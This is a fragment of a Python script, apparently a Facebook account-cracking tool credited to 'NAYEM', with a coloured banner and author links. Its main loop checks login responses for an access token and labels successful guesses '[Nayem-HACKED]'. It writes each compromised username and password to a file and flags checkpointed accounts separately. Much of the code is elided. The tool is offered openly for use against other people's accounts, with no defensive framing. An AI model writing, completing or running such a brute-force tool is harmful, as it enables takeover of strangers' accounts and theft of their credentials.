...
\033[0;94m    /  |/ / /| |\  / __/ / /|_/ / 
\033[0;96m   / /|  / ___ |/ / /___/ /  / /  
\033[0;96m  /_/ |_/_/  |_/_/_____/_/  /_/ 

""")

print("\033[0;91mThis Tool's Free By NAYEM")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : NAYEM'
    print '\033[0;94mFACEBOOK : NAYEM23.08.2001'
    print '\033[0;96mGITHUB   : mad-nayem'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Nayem-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Nayem-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
